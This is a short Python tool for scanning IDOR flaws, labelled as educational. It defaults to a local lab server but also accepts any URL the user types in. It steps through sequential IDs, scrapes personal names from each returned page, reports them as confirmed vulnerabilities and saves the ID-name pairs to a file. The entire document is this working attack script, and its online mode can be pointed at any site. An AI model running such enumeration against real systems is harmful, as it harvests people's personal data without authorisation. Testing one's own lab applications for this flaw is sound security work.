import requests
from bs4 import BeautifulSoup
from colorama import Fore, init

init(autoreset=True)


def scan_local_lab(start_id, end_id):
    """
        Automates IDOR (Insecure Direct Object Reference) testing over a range of IDs.

        Args:
            start_id (int): The beginning of the ID range to scan.
            end_id (int): The end of the ID range to scan.

        1. User chooses an environment (Local vs Online).
        2. Validates the URL structure.
        3. Iterates through the ID range, sending GET requests.
        4. Parses HTML to find exposed sensitive data in specific tags.
    """

    print(f"{Fore.RED}Author: Eugene Zavirukha...")
    print(f"{Fore.RED}Date of creating: 14.03.2026\n[!] Created for EDUCATION PURPOSES only [!]\n")

    print(f"1. Local\n2. Online")

    BASE_URL = ""
    # Environment choosing logic
    while not BASE_URL:
        choosing_environment = input(": ").strip()

        if choosing_environment == "1":
            BASE_URL = "http://127.0.0.1:5000/story.php?person="
            print(f"{Fore.CYAN}Running a local environment audit...\n")

        elif choosing_environment == "2":
            USER_URl = input(f"{Fore.YELLOW}Enter target URL (e.g., http://site.com/story.php?person=): ").strip()

            if USER_URl.startswith("http"):
                BASE_URL = USER_URl
                print(f"{Fore.CYAN}Running an online environment audit...\n")

            else:
                print(f"{Fore.RED}[!] Error: URL must start with http:// or https://")
        else:
            print(f"{Fore.RED}[!] Invalid choice.")

    results = []

    # Main scan cycle
    for uid in range(start_id, end_id + 1):
        try:
            res = requests.get(f"{BASE_URL}{uid}", timeout=5)

            if res.status_code == 200:
                soup = BeautifulSoup(res.text, 'html.parser')
                name_tag = soup.find('span', style="margin-left:2px;")
                name = name_tag.get_text(strip=True) if name_tag else ""

                if name:
                    print(f"{Fore.GREEN}[+] Vulnerability IDOR confirmed! ID {uid}: {name}")
                    results.append(f"{uid} = {name}")

                else:
                    print(f"{Fore.WHITE}[.] ID {uid}: Page is empty or data not found.")

            elif res.status_code == 404:
                print(f"{Fore.YELLOW}[-] ID {uid}: 404 Not Found.")

            else:
                print(f"{Fore.YELLOW}[?] ID {uid}: Received status code {res.status_code}")

        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}\n[!] Connection Error. Check if the server is running.")
            break

        except requests.exceptions.Timeout:
            print(f"{Fore.RED}\n[!] Request Timeout at ID {uid}.")
            continue

        except Exception as e:
            print(f"{Fore.RED}\n[!] An unexpected error occurred: {e}")
            break

    if results:
        save_choice = input(f"\n{Fore.YELLOW}Do you want to save results to a .txt file? (y/n): ").lower()
        if save_choice == 'y':
            # Cleaning file name because of Windows
            clean_filename = BASE_URL.replace("http://", "").replace("https://", "").replace("/", "_").replace("?",
                                                                                                               "_").replace(
                "=", "_").replace(":", "_")
            filename = f"{clean_filename}.txt"

            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("\n".join(results))
                print(f"{Fore.CYAN}[*] Success! Results saved to: {filename}")
            except Exception as e:
                print(f"{Fore.RED}[!] Could not save file: {e}")
    else:
        print(f"\n{Fore.WHITE} [?] Nothing to save.")


if __name__ == "__main__":
    scan_local_lab(1, 10)  # Test ID 1 - 10
